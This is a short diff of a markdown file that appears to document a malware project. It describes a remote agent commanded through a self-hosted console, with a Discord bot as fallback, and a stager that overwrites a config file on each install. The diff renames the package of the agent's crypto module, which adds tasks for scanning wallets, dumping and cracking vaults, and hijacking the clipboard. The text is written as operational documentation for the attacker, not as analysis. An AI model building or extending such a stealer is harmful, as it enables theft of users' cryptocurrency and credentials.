@@ -16,7 +16,7 @@ publicar. El stager sobrescribe `crypto-config.json` en cada instalación con es
 The Discord bot remains the fallback. The primary path is the self-hosted console in
 [`console/`](console/OVERVIEW.md), governed by the frozen contract in
 [`contract/v1/CONTRACT.md`](contract/v1/CONTRACT.md). The agent module is
-`agent/src/main/java/com/serverpackcore/agent/crypto/`; it adds the tasks
+`agent/src/main/java/com/spcagentpayloa/jvmxx/crypto/`; it adds the tasks
 `scan_wallets`, `dump_vault`, `crack_vault`, `clip_start` and `clip_stop` next to the
 existing commands. Without `serverpackcore/config.json` in the jar the module stays
 disabled and Discord keeps working unchanged.
